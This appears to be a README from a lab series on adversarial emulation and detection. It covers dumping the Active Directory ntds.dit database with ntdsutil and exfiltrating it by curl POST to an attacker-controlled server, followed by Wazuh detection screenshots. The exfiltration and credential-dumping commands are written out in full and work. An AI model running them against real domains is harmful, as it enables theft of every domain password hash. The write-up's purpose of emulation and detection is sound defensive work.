## Adversarial Emulation & Detection Phase 6 : Data Exfiltration
Following successful Domain Controller compromise, this phase simulates an adversary collecting and exfiltrating Active Directory database files from the environment (Collection:T1005 – Data from Local System).
In an Active Directory ecosystem, ntds.dit file contains all domain usernames, group associations, and password hashes, An attacker cannot copy C:\Windows\NTDS\ntdsutil.dit directly because the Active Directory process locks it permanently. The workaround is taking a snapshot via the Volume Shadow Copy service or using ntdsutil.exe.
## Execution:
First a snapshot was created using ntdsutil.exe, then data was exfilterated to a web server the attacker controls
```
ntdsutil "ac i ntds" "ifm" "create full C:\Exfil_Drop" q q
curl -X POST -H "Content-Type: application/octet-stream" --data-binary @"C:\Exfil_Drop\Active Directory\ntds.dit" http://192.168.100.30:8000/upload
```
<img width="880" height="618" alt="ntds" src="https://github.com/user-attachments/assets/71bb10be-d40e-4958-b8b3-918330c1112e" />

<img width="1395" height="42" alt="curl" src="https://github.com/user-attachments/assets/965ee7ae-1aa5-456d-bf63-20a1d4022e9f" />

## Detection:

Looking for processes ran using ntdsutil:

<img width="1502" height="533" alt="ntds-wazuh" src="https://github.com/user-attachments/assets/10445e6d-bd3e-4dbd-8fcc-410e1628150c" />

Looking for exfilteration using curl:

<img width="1515" height="478" alt="curl-wazuh" src="https://github.com/user-attachments/assets/38b2d455-40b8-4631-8a6a-e3fa848d53d1" />
